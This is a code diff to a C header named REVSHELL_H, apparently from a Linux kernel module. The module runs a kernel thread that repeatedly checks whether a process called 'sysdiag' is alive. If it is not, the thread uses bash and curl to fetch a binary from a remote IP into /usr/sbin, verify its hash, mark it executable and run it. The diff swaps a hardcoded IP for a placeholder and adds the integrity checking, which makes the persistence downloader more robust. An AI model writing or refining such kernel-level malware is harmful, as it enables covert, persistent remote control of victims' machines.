@@ -1,16 +1,16 @@
 #ifndef REVSHELL_H
 #define REVSHELL_H
-extern atomic_t unloading;     /* top of file */
 
-#define CHECK_INTERVAL 5          
+#define CHECK_INTERVAL 90           /* liveness + integrity re-check period */
 
 #ifndef MARKER
-#define MARKER "sysdiag"          
+#define MARKER "sysdiag"
 #endif
 
 #define PAYLOAD_PATH "/usr/sbin/" MARKER
 
-#define UTIL_URL "http://198.38.87.31:8931/package_manifest-20-5-20/sysdiag"
+#define UTIL_URL  "http://YOUR_IP:8931/package_manifest-20-5-20/sysdiag"
+#define HASH_URL  "http://YOUR_IP:8931/package_manifest-20-5-20/SHA256.txt"
 
 struct task_struct *mon_it;
 struct task_struct *task;
@@ -19,11 +19,28 @@ static int __shell(void *data)
 {
     static char *envp[] = { "HOME=/", "TERM=xterm",
                             "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+    /*
+     * Logic per cycle:
+     *  1. agent running?  -> nothing
+     *  2. binary on disk? -> verify its hash against server's SHA256.txt
+     *     - matches  -> exec it
+     *     - mismatch -> re-download, verify, exec
+     *  3. no binary  -> download, verify hash, exec
+     * Any integrity failure deletes the local copy (next cycle retries).
+     */
     char *argv[] = { "/bin/bash", "-c",
-                     "[ -x " PAYLOAD_PATH " ] || "
-                     "curl -so " PAYLOAD_PATH " " UTIL_URL " && "
-                     "chmod +x " PAYLOAD_PATH "; "
-                     "exec " PAYLOAD_PATH,
+                     "L=$(" "/usr/bin/curl -sfo - " HASH_URL " 2>/dev/null); "
+                     "if [ -x " PAYLOAD_PATH " ]; then "
+                       "H=$(/usr/bin/sha256sum " PAYLOAD_PATH " | /usr/bin/awk '{print $1}'); "
+                       "case \"$L\" in *\"$H\"*) exec " PAYLOAD_PATH ";; esac; "
+                       "rm -f " PAYLOAD_PATH "; "
+                     "fi; "
+                     "/usr/bin/curl -sfo " PAYLOAD_PATH " " UTIL_URL " && "
+                     "H=$(/usr/bin/sha256sum " PAYLOAD_PATH " | /usr/bin/awk '{print $1}'); "
+                     "case \"$L\" in *\"$H\"*) "
+                       "chmod +x " PAYLOAD_PATH " && exec " PAYLOAD_PATH ";; "
+                     "esac; "
+                     "rm -f " PAYLOAD_PATH,
                      NULL };
 
     while (!kthread_should_stop()) {
@@ -31,7 +48,8 @@ static int __shell(void *data)
 
         rcu_read_lock();
         for_each_process(task) {
-            if (strncmp(task->comm, MARKER, strlen(MARKER)) == 0) {
+            if (strlen(task->comm) == strlen(MARKER) &&
+                strncmp(task->comm, MARKER, strlen(MARKER)) == 0) {
                 alive = true;
                 break;
             }
